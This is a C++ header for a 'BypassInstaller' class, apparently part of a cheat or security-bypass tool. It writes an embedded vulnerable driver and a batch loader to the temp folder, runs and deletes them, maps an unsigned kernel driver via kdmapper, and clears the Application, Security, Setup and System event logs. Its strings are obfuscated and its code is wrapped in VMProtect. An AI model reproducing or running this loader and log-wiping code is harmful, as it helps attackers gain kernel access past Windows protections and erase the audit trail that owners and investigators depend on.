#pragma once
#include "BufferVulDirver.h"
#include "BufferBat.h"
#include "../Universal/vmprotect.h"
#include "../kdmapper/exports.h"
class BypassInstaller
{
public:
	bool ClearMapperLogs();
	bool LoadVulnerableDriver();
	bool MapDriver();
private:
	// make them constexpr?
	const std::string driver_name = E("scmbusl.sys");
	const std::string loadbat_name = E("load.bat");


	bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size);

};



inline bool BypassInstaller::ClearMapperLogs()
{
	Protect();
	const char* log_names[] = { E("Application"), E("Security"), E("Setup"), E("System") };

	DWORD logs_cleared = 0;
	HANDLE hLog;

	for (int i = 0; i < 4; i++) {
		hLog = OpenEventLog(NULL, log_names[i]);
		if (hLog)
			if (ClearEventLog(hLog, NULL)) {
				logs_cleared++;
				CloseEventLog(hLog);
			}
	}

	if (hLog)
	{
		CloseHandle(hLog);

		if (logs_cleared == 4)
			return true;
	}
	else
	{
		std::cerr << E("Couldn't clear mapper logs.") << std::endl;
	}
	ProtectEnd();
	return false;
}

inline bool BypassInstaller::LoadVulnerableDriver()
{
	Protect();
	std::system(E("sc stop scmbusl"));
	std::system(E("cls"));

	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH) return false;
	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
	if (!CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(scmbusl_data), sizeof(scmbusl_data))) return false;


	char temp_directory1[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret1 = GetTempPathA(sizeof(temp_directory1), temp_directory1);
	if (!get_temp_path_ret1 || get_temp_path_ret1 > MAX_PATH) return false;
	const std::string Loadbat_path = std::string(temp_directory1) + "\\" + loadbat_name;
	if (!CreateFileFromMemory(Loadbat_path, reinterpret_cast<const char*>(Loadbat), sizeof(Loadbat))) return false;
	// loads the driver.
	std::system(Loadbat_path.c_str());
	std::system(E("cls"));


	const auto removeTempdriver = std::remove(driver_path.c_str());

	if (removeTempdriver != 0)
		return false;

	const auto removeTempBatfile = std::remove(Loadbat_path.c_str());

	if (removeTempBatfile != 0)
		return false;
	ProtectEnd();
	return true;
}

inline bool BypassInstaller::CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size) {
	Protect();
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size))
	{
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	ProtectEnd();
	return true;
}
inline bool BypassInstaller::MapDriver() 
{
	Protect();
	kdmappermain();
	ProtectEnd();
	return true;
}
